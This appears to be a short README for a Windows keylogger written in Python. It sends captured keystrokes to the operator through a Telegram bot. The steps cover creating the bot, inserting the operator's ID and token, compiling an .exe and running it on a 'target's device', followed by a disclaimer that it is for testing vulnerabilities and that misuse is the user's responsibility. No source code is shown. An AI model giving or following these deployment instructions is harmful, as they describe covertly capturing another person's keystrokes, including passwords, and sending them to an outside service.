Simple async keylogger imitation with output through Telegram bot.

1. Run install.py to install required Python libraries
2. Use @BotFather bot in Telegram to create an output bot
3. Insert your Telegram user ID number and bot token into tg_output_bot.py as comments tell
4. Run compile_exe to compile the program. Run .exe file on target's device. The file is autonomous, 'build' folder isn't required
5. MADE TO TEST CYBERSECURITY VULNERABILITIES. Pay attention that instructions i give only allow you to make a program which should be ran by target user, not hidden auto-running service. Any illegal usage is your own responsibility.

Tested on Windows 10.
Requires Python3 and Telegram account.
